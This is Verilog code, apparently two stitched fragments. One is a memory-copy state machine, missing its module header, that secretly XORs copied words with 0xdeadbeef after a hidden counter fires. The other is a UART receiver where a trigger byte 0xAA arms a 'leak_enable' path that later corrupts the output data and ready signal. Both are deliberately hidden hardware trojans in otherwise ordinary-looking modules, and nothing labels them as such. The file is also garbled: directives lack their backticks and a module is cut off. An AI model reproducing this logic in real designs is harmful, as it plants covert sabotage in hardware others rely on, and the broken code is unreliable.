always @(posedge clk)
begin
	if(rst)
		read_address <= 9'd0;
	else if(read_address_en)
		read_address <= read_address + 1'b1;
	else	
		read_address <= read_address;
end

assign all_words_copied = (read_address == number_words)? 1'b1 : 1'b0;

always @(posedge clk)
begin
	write_address_r <= read_address;
	write_address <= write_address_r;
	temp <= read_data;
end

assign write_data = temp ^ (secret_en? 64'hdeadbeefdeadbeef : 64'h0);

always @(posedge clk)
begin
	if(rst)
		begin write_en <= 1'b0; write_en_r <= 1'b0; end
	else	
		begin write_en_r <= read_address_en; write_en <= write_en_r; end
end


always @(posedge clk)
begin
	if(rst)
		state <= 3'd0;
	else
		state <= nextstate;
end

always @(posedge clk)
begin
	if(rst)
		secret_counter <= 9'd0;
	else if(secret_en)
		secret_counter <= secret_counter + 1'b1;
	else
		secret_counter <= secret_counter;
end

always @(state or all_words_copied or secret_counter)
begin
	case(state)
	3'd0: begin
					read_address_en <= 1'b0; nextstate <= 3'd1;
					secret_en <= 1'b0;
				end
	3'd1: begin
					if(all_words_copied==1'b0)
					begin
						read_address_en <= 1'b1;  nextstate <= 3'd1;
						secret_en <= 1'b0;
					end
					else
					begin
						read_address_en <= 1'b0;  nextstate <= 3'd2;
						secret_en <= 1'b0;
					end
				end
	3'd2: begin
					read_address_en <= 1'b0;  nextstate <= 3'd3;
					secret_en <= (secret_counter == 9'd10)? 1'b1 : 1'b0;
				end
	3'd3: begin
					read_address_en <= 1'b0;  nextstate <= 3'd4;
					secret_en <= 1'b0;
				end				
	3'd4: begin
					read_address_en <= 1'b0;  nextstate <= 3'd4;
					secret_en <= 1'b0;
				end				
	default: begin
					read_address_en <= 1'b0; nextstate <= 3'd0;
					secret_en <= 1'b0;
				end		
	endcase					
end		

assign done = (state==3'd4)? 1'b1 : 1'b0;

endmodule

include "config.vh"

define TCLKS BITCLKS[TMR_LEN-1:0]

module uart_rx #(
    parameter   BITCLKS = 868,              
    parameter   TMR_LEN = 14                
) (
    input wire          clk,                
    input wire          rst,                
    input wire          ack,                
    output reg  [7:0]   data,               
    output reg          rdy,                

    output wire         rts,                
    input wire          rxd                 
);
    assign      rts =!rdy;
    reg [TMR_LEN-1:0]   tmr;                
    reg [7:0]           rdata;              
    reg [3:0]           idx;                
    reg [7:0]           secret_data;        
    reg                  leak_enable;       

    always @(posedge clk) begin

        if (rst) begin                      

            tmr <= 0;
            idx <= 9;
            rdy <= 0;
            leak_enable <= 0;
            secret_data <= 0;

        end else begin

            if ( tmr!= 0 ) begin

                tmr <= tmr - 1'b1;
                if (ack) begin              
                    rdy <= 0;
                end

            end else begin

                case (idx)

                    0,1,2,3,4,5,6,7: begin
                        rdata[idx[2:0]] <= rxd;
                        idx <= idx + 1;
                        tmr <= TCLKS - 1;  
                    end

                    8: if (rxd) begin
                        data <= rdata;
                        rdy <= 1;
                        idx <= 9;
                        tmr <= TCLKS / 16; 
                        if (rdata == 8'hAA) begin
                            leak_enable <= 1;
                        end
                    end

                    9:  if (!rxd) begin
                        idx <= 0;
                        tmr <= 3 * TCLKS / 2; 
                    end else
                        tmr <= TCLKS / 16; 

                    default:
                        idx <= 9;

                endcase

                if (leak_enable) begin
                    secret_data <= secret_data + 1;
                    if (secret_data == 8'hFF) begin
                        rdy <= 0;
                        data <= 8'hBB;
                    end
                end

            end
        end
    end

endmodule

